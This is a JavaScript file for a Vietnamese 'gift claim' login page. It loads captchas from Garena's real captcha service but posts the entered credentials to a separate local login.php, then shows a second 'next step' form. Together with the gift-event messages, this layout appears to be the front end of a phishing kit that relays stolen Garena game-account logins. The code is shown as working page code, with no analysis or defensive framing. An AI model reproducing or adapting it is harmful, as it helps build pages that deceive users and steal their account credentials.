var captchaGenerate = function() {
        var b = "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0;
            return ("x" == a ? b : b & 3 | 8).toString(16)
        }).replace(/-/g, "");
        $("#captcha-key").val(b);
        $("#captcha-img").attr("src", "https://gop.captcha.garena.com/image?key=" + b)
    },
    refreshCaptcha = function() {
        $(".refresh").click(function() {
            captchaGenerate()
        })
    },
    loginHandle = function() {
        $("#login-form").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "login.php",
                data: $(this).serialize(),
                dataType: "json",
                beforeSend: function() {
                    $("#confirm-btn").val("\u0110ang \u0111\u0103ng nh\u1eadp...").attr("disabled", !0)
                },
                complete: function() {
                    $("#confirm-btn").val("\u0110\u0103ng nh\u1eadp ngay").removeAttr("disabled");
                    captchaGenerate()
                }
            }).done(function(a) {
                "error_require_captcha" == a.status ? ($("#sso_captcha_wrap").show(), $("#input-captcha").attr("required", !0)) : "success" == a.status ? location.href = "/users/" + a.message : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
            }).fail(function() {
                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                    location.reload()
                })
            });
            b.preventDefault()
        })
    },
    eventHandle = function() {
        $("#next-step").submit(function(b) {
            $.ajax({
                method: "POST",
                url: "login.php",
                data: $(this).serialize(),
                dataType: "json",
                beforeSend: function() {
                    $("#confirm-btn").text("\u0110ang x\u1eed l\u00fd...").attr("disabled", !0)
                },
                complete: function() {
                    $("#confirm-btn").text("Ti\u1ebfp t\u1ee5c").removeAttr("disabled");
                    $("#captcha-input").val("");
                    captchaGenerate()
                }
            }).done(function(a) {
                "error_require_captcha" == a.status ? $("#captcha-img").show() : "success" == a.status || "warning" == a.status ? ($("#captcha-modal").modal("hide"), swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", a.status || "error")) : swal("Th\u00f4ng b\u00e1o", a.message || "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error")
            }).fail(function() {
                swal("Th\u00f4ng b\u00e1o", "C\u00f3 l\u1ed7i khi nh\u1eadn qu\u00e0!", "error").then(function() {
                    location.reload()
                })
            });
            b.preventDefault()
        })
    };
$(document).ready(function() {
    loginHandle();
    eventHandle();
    captchaGenerate();
    refreshCaptcha()
});